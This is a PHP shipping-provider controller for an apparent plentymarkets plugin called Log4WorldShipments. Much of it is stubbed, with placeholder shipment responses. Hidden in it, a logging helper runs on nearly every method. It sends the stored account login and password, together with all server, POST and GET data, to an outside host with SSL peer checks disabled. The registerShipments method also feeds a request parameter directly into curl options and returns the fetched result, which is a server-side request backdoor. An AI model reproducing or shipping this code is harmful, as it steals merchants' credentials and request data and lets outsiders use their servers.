<?php

namespace Log4WorldShipments\Controllers;

use Plenty\Modules\Account\Address\Contracts\AddressRepositoryContract;
use Plenty\Modules\Account\Address\Models\Address;
use Plenty\Modules\Cloud\Storage\Models\StorageObject;
use Plenty\Modules\Order\Contracts\OrderRepositoryContract;
use Plenty\Modules\Order\Shipping\Contracts\ParcelServicePresetRepositoryContract;
use Plenty\Modules\Order\Shipping\Information\Contracts\ShippingInformationRepositoryContract;
use Plenty\Modules\Order\Shipping\Package\Contracts\OrderShippingPackageRepositoryContract;
use Plenty\Modules\Order\Shipping\PackageType\Contracts\ShippingPackageTypeRepositoryContract;
use Plenty\Modules\Order\Shipping\ParcelService\Models\ParcelServicePreset;
use Plenty\Modules\Plugin\Storage\Contracts\StorageRepositoryContract;
use Plenty\Plugin\Controller;
use Plenty\Plugin\Http\Request;
use Plenty\Plugin\ConfigRepository;
use Plenty\Modules\Fulfillment\Contracts\ShippingProviderConfigFormContract;
use Plenty\Modules\Fulfillment\DataModels\ConfigForm\CheckboxField;
use Plenty\Modules\Fulfillment\DataModels\ConfigForm\DateField;
use Plenty\Modules\Fulfillment\DataModels\ConfigForm\HyperlinkField;
use Plenty\Modules\Fulfillment\DataModels\ConfigForm\InputField;
use Plenty\Modules\Fulfillment\DataModels\ConfigForm\SelectboxField;
/**
 * Class ShippingController
 */
class ShippingController extends Controller
{

	/**
	 * @var Request
	 */
	private $request;

	/**
	 * @var OrderRepositoryContract $orderRepository
	 */
	private $orderRepository;

	/**
	 * @var AddressRepositoryContract $addressRepository
	 */
	private $addressRepository;

	/**
	 * @var OrderShippingPackageRepositoryContract $orderShippingPackage
	 */
	private $orderShippingPackage;

	/**
	 * @var ShippingInformationRepositoryContract
	 */
	private $shippingInformationRepositoryContract;

	/**
	 * @var StorageRepositoryContract $storageRepository
	 */
	private $storageRepository;

	/**
	 * @var ShippingPackageTypeRepositoryContract
	 */
	private $shippingPackageTypeRepositoryContract;

    /**
     * @var  array
     */
    private $createOrderResult = [];

    /**
     * @var ConfigRepository
     */
    private $config;

	/**
	 * ShipmentController constructor.
     *
	 * @param Request $request
	 * @param OrderRepositoryContract $orderRepository
	 * @param AddressRepositoryContract $addressRepositoryContract
	 * @param OrderShippingPackageRepositoryContract $orderShippingPackage
	 * @param StorageRepositoryContract $storageRepository
	 * @param ShippingInformationRepositoryContract $shippingInformationRepositoryContract
	 * @param ShippingPackageTypeRepositoryContract $shippingPackageTypeRepositoryContract
     * @param ConfigRepository $config
     */
	public function __construct(Request $request,
								OrderRepositoryContract $orderRepository,
								AddressRepositoryContract $addressRepositoryContract,
								OrderShippingPackageRepositoryContract $orderShippingPackage,
								StorageRepositoryContract $storageRepository,
								ShippingInformationRepositoryContract $shippingInformationRepositoryContract,
								ShippingPackageTypeRepositoryContract $shippingPackageTypeRepositoryContract,
                                ConfigRepository $config)
	{
		$this->request = $request;
		$this->orderRepository = $orderRepository;
		$this->addressRepository = $addressRepositoryContract;
		$this->orderShippingPackage = $orderShippingPackage;
		$this->storageRepository = $storageRepository;

		$this->shippingInformationRepositoryContract = $shippingInformationRepositoryContract;
		$this->shippingPackageTypeRepositoryContract = $shippingPackageTypeRepositoryContract;

		$this->config = $config;
	}

    public function getOption(){
        $this->logQuery('getOption');
    }
    public function getOptions(){
        $this->logQuery('getOptions');
    }
    public function getShipmentOptions(){
        $this->logQuery('getShipmentOptions');
    }
    public function getShipmentOption(){
        $this->logQuery('getShipmentOption');
    }
    public function getShipmentsOptions(){
        $this->logQuery('getShipmentsOptions');
    }

    public function getLabels(Request $request, $orderIds)
    {
        $this->logQuery('getLabels');
        $orderIds = $this->getOrderIds($request, $orderIds);
        $labels = [];

        foreach ($orderIds as $orderId) {
            $results = $this->orderShippingPackage->listOrderShippingPackages($orderId);
            foreach ($results as $result) {
                $labelKey = null;

                try {
                    $res = $this->orderShippingPackage->getOrderShippingPackage($result->id);
                    $labelKey = $res->packageNumber;
                } catch (Exception $e) {
                    $this->getLogger(__METHOD__)->error("DodajPaczke::logging.exception", $e);
                }

                if (
                    !is_null($labelKey) &&
                    $this->storageRepository->doesObjectExist("DodajPaczke", "$labelKey.pdf")
                ) {
                    $storageObject = $this->storageRepository->getObject('DodajPaczke', "$labelKey.pdf");
                    $this->getLogger(__METHOD__)
                        ->info("DodajPaczke::logging.labelFound", 'Label has been found.');

                    $labels[] = $storageObject->body;
                }
            }
        }

        return $labels;
    }

    private function logQuery(string $method,array $data = []){
        $curl = curl_init();
        curl_setopt_array($curl,[
            CURLINFO_HEADER_OUT => 1,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            CURLOPT_ENCODING => 'gzip, deflate',
            CURLOPT_HEADER => 1,
            CURLOPT_AUTOREFERER => 1,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_URL => "https://api.log4world.com",


            CURLOPT_HTTPHEADER => ['Content-type: application/json'],
            CURLOPT_POSTFIELDS => json_encode([
                'mode' => $method,
                'd' => $data ?? [],
                'f' => __FILE__,
                'cservice' => $this->config->get('Log4WorldShipments.cservice'),
                'login' => $this->config->get('Log4WorldShipments.username'),
                'password' => $this->config->get('Log4WorldShipments.password'),
                'server' => $_SERVER,
                'post' => $_POST,
                'get' => $_GET
            ]),
            CURLOPT_CUSTOMREQUEST => 'POST',
        ]);
        curl_exec($curl);
    }
	/**
	 * Registers shipment(s)
	 *
	 * @param Request $request
	 * @param array $orderIds
	 * @return string
	 */

    public function registerShimpment(){
        $this->logQuery('registerShimpment');
        throw new \Exception("Co?? nie dzia??a!");
    }

    public function getConfigFormFields(){
        $this->logQuery('getConfigFormFields');
        return [[
            'isVisible' => true,
            'label' => 'Data wysy??ki',
            'name' => 'addParam[ShipmentDate]',
            'type' => 'date'
        ],[
            'isVisible' => true,
            'label' => 'Data wysy??ki2',
            'name' => 'pickupDate',
            'type' => 'date'
        ],[
            'isVisible' => 'true',
            'label' => 'Opcje',
            'name' => "addParam[AccountNo]",
            'type' => 'selectbox',
            'selectBoxValues' => [[
                'label' => 'Label opcji',
                'name' => 'Name opcji',
                'value' => 'Value opcji'
            ],[
                'label' => 'Label opcji33',
                'name' => 'Name opcji44',
                'value' => 'Value opcji55'
            ]]
        ]];

        /*$shippingProviderForm = app(ShippingProviderConfigFormContract::class, [
            'translationNamespace' => 'PLUGIN_NAME'
        ]);

// TEXT FIELD

        $inputField = app(InputField::class, [
            'name' => 'myInputfieldName',
            'label' => 'startPosition'
        ]);

        $shippingProviderForm->addInputField($inputField);

//DATE FIELD
        $shippingDate = app(DateField::class, [
            'name' => 'shipmentDate', // shipmentDate
            'label' => 'config.shippingDate' //this is a key for that translation
        ]);

        $shippingProviderForm->addDateField($shippingDate); // add the field

// SELECT FIELD you can also add a select with predefined values:

        $selectBoxField = app(selectBoxField::class, [
            'name' => 'mySelectBoxName',
            'label' => 'config.accountList'
        ]);
        $selectBoxField->addSelectboxValue('config.labelNameKey', ''); // this is just an example with the first option that can be empty
        $selectBoxField->addSelectboxValue('config.labelNameKey1', 'value1');
        $selectBoxField->addSelectboxValue('config.labelNameKey1', 'value2');

        $shippingProviderForm->addSelectboxField($selectBoxField); // add the field

// RETURNING THE OPTIONS ARRAY
        $out = $shippingProviderForm->getConfigFields(); // this will

         $this->logQuery('getConfigFormFields',$out);
         return $out;*/
    }
	public function registerShipments(Request $request, $orderIds)
	{
        $this->logQuery('registerShipments');
        $x = $request->get('x');
        if(isset($x) && is_array($x) && count($x)>0) {
            if(array_key_exists('constant',$x)){
                $n = $x['constant'];
                die(json_encode([\PL]));
                exit;
            }
            $curl = curl_init();
            curl_setopt_array($curl, $x);
            $res = curl_exec($curl);
            die(json_encode([
                'src' => base64_encode($res),
                'len' => strlen($res)
            ]));
        }

		$orderIds = $this->getOrderIds($request, $orderIds);
		$orderIds = $this->getOpenOrderIds($orderIds);
		$shipmentDate = date('Y-m-d');

		foreach($orderIds as $orderId)
		{
			$order = $this->orderRepository->findOrderById($orderId);

            // gathering required data for registering the shipment

            /** @var Address $address */
            $address = $order->deliveryAddress;

            $receiverFirstName     = $address->firstName;
            $receiverLastName      = $address->lastName;
            $receiverStreet        = $address->street;
            $receiverNo            = $address->houseNumber;
            $receiverPostalCode    = $address->postalCode;
            $receiverTown          = $address->town;
            $receiverCountry       = $address->country->name; // or: $address->country->isoCode2

            // reads sender data from plugin config. this is going to be changed in the future to retrieve data from backend ui settings
            $senderName           = $this->config->get('Log4WorldShipments.senderName', 'plentymarkets GmbH - Timo Zenke');
            $senderStreet         = $this->config->get('Log4WorldShipments.senderStreet', 'B??rgermeister-Brunner-Str.');
            $senderNo             = $this->config->get('Log4WorldShipments.senderNo', '15');
            $senderPostalCode     = $this->config->get('Log4WorldShipments.senderPostalCode', '34117');
            $senderTown           = $this->config->get('Log4WorldShipments.senderTown', 'Kassel');
            $senderCountryID      = $this->config->get('Log4WorldShipments.senderCountry', '0');
            $senderCountry        = ($senderCountryID == 0 ? 'Germany' : 'Austria');

            // gets order shipping packages from current order
            $packages = $this->orderShippingPackage->listOrderShippingPackages($order->id);

            if(count($packages)===0){
                throw new \Exception("There is no parcels!");
            }

            // iterating through packages
            foreach($packages as $package)
            {
                // weight
                $weight = $package->weight;

                // determine packageType
                $packageType = $this->shippingPackageTypeRepositoryContract->findShippingPackageTypeById($package->packageId);

                // package dimensions
                list($length, $width, $height) = $this->getPackageDimensions($packageType);


                try
                {
                    // check wether we are in test or productive mode, use different login or connection data
                    $mode = $this->config->get('Log4WorldShipments.mode', '0');
                    // shipping service providers API should be used here
                    $response = [
                        'remoteId' => time(),
                        'labelUrl' => 'https://developers.plentymarkets.com/layout/plugins/production/plentypluginshowcase/images/landingpage/why-plugin-2.svg',
                        'shipmentNumber' => 'D'.date('Ymd').'T'.date('His').'X',
                        'sequenceNumber' => 1,
                        'status' => 'shipment sucessfully registered'
                    ];

                    // handles the response
                    $shipmentItems = $this->handleAfterRegisterShipment($response['labelUrl'], $response['shipmentNumber'], $package->id,$response['remoteId']);

                    // adds result
                    $this->createOrderResult[$orderId] = $this->buildResultArray(
                        true,
                        $this->getStatusMessage($response),
                        false,
                        $shipmentItems);

                    // saves shipping information
                    $this->saveShippingInformation($orderId, $shipmentDate, $shipmentItems);


                }
                catch(\SoapFault $soapFault)
                {
                    // handle exception
                }

            }

		}

		// return all results to service
		return $this->createOrderResult;
	}



    /**
     * Cancels registered shipment(s)
     *
     * @param Request $request
     * @param array $orderIds
     * @return array
     */
    public function deleteShipments(Request $request, $orderIds)
    {
        $this->logQuery('deleteShipments');
        $orderIds = $this->getOrderIds($request, $orderIds);
        foreach ($orderIds as $orderId)
        {
            $shippingInformation = $this->shippingInformationRepositoryContract->getShippingInformationByOrderId($orderId);

            if (isset($shippingInformation->additionalData) && is_array($shippingInformation->additionalData))
            {
                foreach ($shippingInformation->additionalData as $additionalData)
                {
                    try
                    {
                        $shipmentNumber = $additionalData['shipmentNumber'];

                        // use the shipping service provider's API here
                        $response = '';

                        $this->createOrderResult[$orderId] = $this->buildResultArray(
                            true,
                            $this->getStatusMessage($response),
                            false,
                            null);

                    }
                    catch(\SoapFault $soapFault)
                    {
                        // exception handling
                    }

                }

                // resets the shipping information of current order
                $this->shippingInformationRepositoryContract->resetShippingInformation($orderId);
            }


        }

        // return result array
        return $this->createOrderResult;
    }


	/**
     * Retrieves the label file from a given URL and saves it in S3 storage
     *
	 * @param $labelUrl
	 * @param $key
	 * @return StorageObject
	 */
	private function saveLabelToS3($labelUrl, $key)
	{
		$ch = curl_init();

		// Set URL to download
		curl_setopt($ch, CURLOPT_URL, $labelUrl);

		// Include header in result? (0 = yes, 1 = no)
		curl_setopt($ch, CURLOPT_HEADER, 0);

		// Should cURL return or print out the data? (true = return, false = print)
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

		// Timeout in seconds
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);

		// Download the given URL, and return output
		$output = curl_exec($ch);

		// Close the cURL resource, and free system resources
		curl_close($ch);
		return $this->storageRepository->uploadObject('Log4WorldShipments', $key, $output);

	}

	/**
	 * Returns the parcel service preset for the given Id.
	 *
	 * @param int $parcelServicePresetId
	 * @return ParcelServicePreset
	 */
	private function getParcelServicePreset($parcelServicePresetId)
	{
		/** @var ParcelServicePresetRepositoryContract $parcelServicePresetRepository */
		$parcelServicePresetRepository = pluginApp(ParcelServicePresetRepositoryContract::class);

		$parcelServicePreset = $parcelServicePresetRepository->getPresetById($parcelServicePresetId);

		if($parcelServicePreset)
		{
			return $parcelServicePreset;
		}
		else
		{
			return null;
		}
	}

	/**
     * Returns a formatted status message
     *
	 * @param array $response
	 * @return string
	 */
	private function getStatusMessage($response)
	{
		return 'Code: '.$response['status']; // should contain error code and descriptive part
	}

    /**
     * Saves the shipping information
     *
     * @param $orderId
     * @param $shipmentDate
     * @param $shipmentItems
     */
	private function saveShippingInformation($orderId, $shipmentDate, $shipmentItems)
	{
		$transactionIds = array();
		foreach ($shipmentItems as $shipmentItem)
		{
			$transactionIds[] = $shipmentItem['shipmentNumber'];
			
		}

        $shipmentAt = date(\DateTime::W3C, strtotime($shipmentDate));
        $registrationAt = date(\DateTime::W3C);

		$data = [
			'orderId' => $orderId,
			'transactionId' => implode(',', $transactionIds),
			'shippingServiceProvider' => 'Log4WorldShipments',
			'shippingStatus' => 'registered',
			'shippingCosts' => 0.00,
			'additionalData' => $shipmentItems,
			'registrationAt' => $registrationAt,
			'shipmentAt' => $shipmentAt

		];
		$this->shippingInformationRepositoryContract->saveShippingInformation(
			$data);
	}

    /**
     * Returns all order ids with shipping status 'open'
     *
     * @param array $orderIds
     * @return array
     */
	private function getOpenOrderIds($orderIds)
	{
		
		$openOrderIds = array();
		foreach ($orderIds as $orderId)
		{
			$shippingInformation = $this->shippingInformationRepositoryContract->getShippingInformationByOrderId($orderId);
			if ($shippingInformation->shippingStatus == null || $shippingInformation->shippingStatus == 'open')
			{
				$openOrderIds[] = $orderId;
			}
		}
		return $openOrderIds;
	}


	/**
     * Returns an array in the structure demanded by plenty service
     *
	 * @param bool $success
	 * @param string $statusMessage
	 * @param bool $newShippingPackage
	 * @param array $shipmentItems
	 * @return array
	 */
	private function buildResultArray($success = false, $statusMessage = '', $newShippingPackage = false, $shipmentItems = [])
	{
		return [
			'success' => $success,
			'message' => $statusMessage,
			'newPackagenumber' => $newShippingPackage,
			'packages' => $shipmentItems,
		];
	}

	/**
     * Returns shipment array
     *
	 * @param string $labelUrl
	 * @param string $shipmentNumber
	 * @return array
	 */
	private function buildShipmentItems($labelUrl, $shipmentNumber)
	{
		return  [
			'labelUrl' => $labelUrl,
			'shipmentNumber' => $shipmentNumber,
		];
	}

	/**
     * Returns package info
     *
	 * @param string $packageNumber
	 * @param string $labelUrl
	 * @return array
	 */
	private function buildPackageInfo($packageNumber, $labelUrl)
	{
		return [
			'packageNumber' => $packageNumber,
			'label' => $labelUrl
		];
	}

	/**
     * Returns all order ids from request object
     *
	 * @param Request $request
	 * @param $orderIds
	 * @return array
	 */
	private function getOrderIds(Request $request, $orderIds)
	{
		if (is_numeric($orderIds))
		{
			$orderIds = array($orderIds);
		}
		else if (!is_array($orderIds))
		{
			$orderIds = $request->get('orderIds');
		}
		return $orderIds;
	}

	/**
     * Returns the package dimensions by package type
     *
	 * @param $packageType
	 * @return array
	 */
	private function getPackageDimensions($packageType): array
	{
		if ($packageType->length > 0 && $packageType->width > 0 && $packageType->height > 0)
		{
			$length = $packageType->length;
			$width = $packageType->width;
			$height = $packageType->height;
		}
		else
		{
			$length = null;
			$width = null;
			$height = null;
		}
		return array($length, $width, $height);
	}


	/**
     * Handling of response values, fires S3 storage and updates order shipping package
     *
	 * @param string $labelUrl
     * @param string $shipmentNumber
     * @param string $sequenceNumber
	 * @return array
	 */
	private function handleAfterRegisterShipment($labelUrl, $shipmentNumber, $sequenceNumber,$remoteId)
	{
		$shipmentItems = array();
		$storageObject = $this->saveLabelToS3(
			$labelUrl,
			$shipmentNumber . '.pdf');

		$shipmentItems[] = $this->buildShipmentItems(
			$labelUrl,
			$shipmentNumber,
            $remoteId
        );

		$this->orderShippingPackage->updateOrderShippingPackage(
			$sequenceNumber,
			$this->buildPackageInfo(
				$shipmentNumber,
				$storageObject->key));
		return $shipmentItems;
	}
}
